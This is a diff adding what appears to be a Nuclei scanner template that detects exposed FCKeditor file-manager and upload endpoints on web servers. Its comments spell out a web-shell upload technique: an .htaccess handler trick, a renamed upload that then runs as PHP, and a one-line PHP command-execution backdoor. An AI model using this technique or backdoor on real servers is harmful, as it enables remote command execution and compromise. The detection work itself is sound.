@@ -1,0 +1,34 @@
+id: FCKEditor Core Exposure
+
+info:
+  name: FCKEditor Core
+  author: Clark
+  severity: info
+#create a htaccess file:code: <FilesMatch "_php.gif">SetHandler application/x-httpd-php</FilesMatch>
+#Now upload shell.php.gif with FCKeditor. After upload shell.php.gif, the name "shell.php.gif" change to "shell_php.gif" automatically, http://target.com/anything/shell_php.gif, Now shell is available from server.
+#https://www.exploit-db.com/exploits/17644
+#https://www.exploit-db.com/exploits/15484
+#https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/1003-exploits/fckeditor-shell.txt,Sample Backdoor:(save as "any_name.php3")<? system($_GET["cmd"]); ?>
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/fckeditor/editor/filemanager/upload/test.html"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/browser/default/connectors/test.html"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/connectors/aspx/upload.aspx"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/connectors/aspx/connector.aspx"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/browser/default/js/fckxml.js"
+      - "{{BaseURL}}/fckeditor/editor/filemanager/browser/default/browser.html?Connector=/editor/filemanager/browser/default/connectors/php/connector.php"
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - fckeditor
+        condition: or
+
+      - type: status
+        status:
+          - 200
+        condition: or
